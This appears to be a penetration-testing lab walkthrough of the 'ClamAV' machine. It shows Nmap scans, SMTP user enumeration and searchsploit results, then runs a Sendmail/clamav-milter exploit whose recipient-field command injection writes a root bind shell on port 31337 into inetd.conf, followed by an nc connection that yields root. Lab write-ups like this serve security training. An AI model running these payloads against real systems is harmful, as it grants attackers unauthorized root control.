## Nmap

```json
┌──(ouyang㉿kali)-[~]
└─$ sudo nmap -A -sV -sS -T4 192.168.156.42
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-15 22:13 CST
Nmap scan report for 192.168.156.42
Host is up (0.26s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey:
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.158], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods:
|_  Potentially risky methods: TRACE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/15%OT=22%CT=1%CU=32602%PV=Y%DS=4%DC=T%G=Y%TM=64DB884
OS:3%P=aarch64-unknown-linux-gnu)SEQ(SP=CB%GCD=1%ISR=CB%TI=Z%TS=A)SEQ(SP=CB
OS:%GCD=1%ISR=CB%TI=Z%II=I%TS=A)OPS(O1=M54EST11NW0%O2=M54EST11NW0%O3=M54ENN
OS:T11NW0%O4=M54EST11NW0%O5=M54EST11NW0%O6=M54EST11)WIN(W1=16A0%W2=16A0%W3=
OS:16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54ENNSNW0%CC=N%
OS:Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=
OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=D138%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5h59m59s, deviation: 2h49m43s, median: 3h59m58s
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-15T14:14:15-04:00

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   322.40 ms 192.168.45.1
2   322.37 ms 192.168.45.254
3   322.46 ms 192.168.251.1
4   323.79 ms 192.168.156.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.55 seconds
```

```json
┌──(ouyang㉿kali)-[~]
└─$ nmap --script smtp-enum-users 192.168.156.42
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-15 22:32 CST
Nmap scan report for 192.168.156.42
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
| smtp-enum-users:
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test
80/tcp  open  http
139/tcp open  netbios-ssn
199/tcp open  smux
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 36.35 seconds
```

SearchSploit
```json
┌──(ouyang㉿kali)-[~]
└─$ searchsploit Sendmail
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Berkeley Sendmail 5.58 - Debug                                                             | linux/remote/19028.txt
BSD 2 / CND 1 / Sendmail 8.x / FreeBSD 2.1.x / HP-UX 10.x / AIX 4 / RedHat 4 - Sendmail Da | multiple/local/19556.sh
Caldera OpenLinux 2.2 / Debian 2.1/2.2 / RedHat 6.0 - Vixie Cron MAILTO Sendmail           | linux/local/19474.txt
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)               | multiple/remote/9913.rb
Eric Allman Sendmail 8.8.x - Socket Hijack                                                 | linux/local/19602.c
Eric Allman Sendmail 8.9.1/8.9.3 - ETRN Denial of Service                                  | linux/dos/19701.sh
Indexu 5.0/5.3 - 'Sendmail.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/29481.txt
Linux Kernel 2.0 Sendmail - Denial of Service                                              | linux/dos/19282.c
Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) - Sendmail 8.10.1 Capabilities Privil | linux/local/20001.sh
Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) - Sendmail Capabilities Privilege Esc | linux/local/20000.c
Metainfo Sendmail 2.0/2.5 / MetaIP 3.1 - Upload / Execute Read Scripts                     | multiple/remote/19084.txt
Morris Worm - sendmail Debug Mode Shell Escape (Metasploit)                                | unix/remote/45789.rb
ObieWebsite Mini Web Shop 2 - 'Sendmail.php?PATH_INFO' Cross-Site Scripting                | php/webapps/29957.txt
PHP 4.x/5.0/5.1 with Sendmail Mail Function - 'additional_param' Arbitrary File Creation   | php/local/27334.txt
PHPMailer < 5.2.19 - Sendmail Argument Injection (Metasploit)                              | multiple/webapps/41688.rb
Sendmail 8.11.6 - Address Prescan Memory Corruption                                        | unix/local/22442.c
Sendmail 8.11.x (Linux/i386) - Local Privilege Escalation                                  | linux/local/411.c
Sendmail 8.11/8.12 Debugger - Arbitrary Code Execution (1)                                 | linux/local/21060.c
Sendmail 8.11/8.12 Debugger - Arbitrary Code Execution (2)                                 | linux/local/21061.c
Sendmail 8.11/8.12 Debugger - Arbitrary Code Execution (3)                                 | linux/local/21062.txt
Sendmail 8.11/8.12 Debugger - Arbitrary Code Execution (4)                                 | linux/local/21063.txt
Sendmail 8.12.6 - Compromised Source Backdoor                                              | unix/remote/21919.sh
Sendmail 8.12.8 (BSD) - 'Prescan()' Remote Command Execution                               | linux/remote/24.c
Sendmail 8.12.9 - 'Prescan()' Variant Remote Buffer Overrun                                | linux/remote/23154.c
Sendmail 8.12.x - 'X-header' Remote Heap Buffer Overflow (PoC)                             | linux/dos/32995.txt
Sendmail 8.12.x - Header Processing Buffer Overflow (1)                                    | unix/remote/22313.c
Sendmail 8.12.x - Header Processing Buffer Overflow (2)                                    | unix/remote/22314.c
Sendmail 8.12.x - SMRSH Double Pipe Access Validation                                      | unix/local/21884.txt
Sendmail 8.13.5 - Remote Signal Handling (PoC)                                             | linux/dos/2051.py
Sendmail 8.6.9 IDENT - Remote Command Execution                                            | unix/remote/20599.sh
Sendmail 8.9.2 - Headers Prescan Denial of Service                                         | irix/dos/23167.c
Sendmail 8.9.x/8.10.x/8.11.x/8.12.x - File Locking Denial of Service (1)                   | linux/dos/21476.c
Sendmail 8.9.x/8.10.x/8.11.x/8.12.x - File Locking Denial of Service (2)                   | linux/dos/21477.c
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                            | multiple/remote/4761.pl
WEBgais 1.0 - websendmail Remote Command Execution                                         | cgi/remote/20483.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```json
┌──(ouyang㉿kali)-[~]
└─$ searchsploit "Sendmail ClamAV"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)               | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                            | multiple/remote/4761.pl
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

發現 4761 可嘗試利用

```json
searchsploit -m 4761
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ perl 4761.pl 192.168.156.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.156.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 15 Aug 2023 14:42:45 -0400; (No UCE/UBE) logging access from: [192.168.45.158](FAIL)-[192.168.45.158]
250-localhost.localdomain Hello [192.168.45.158], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 37FIgjxC004270 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

閱讀結果且透過 nmap 發現 31337 port 已被打開


透過 nc 連線到 bind shell
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ nc 192.168.156.42 31337
whoami
root
cd /root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
b88d0d973fa54bb735eec2bd0d064e35
```

Success!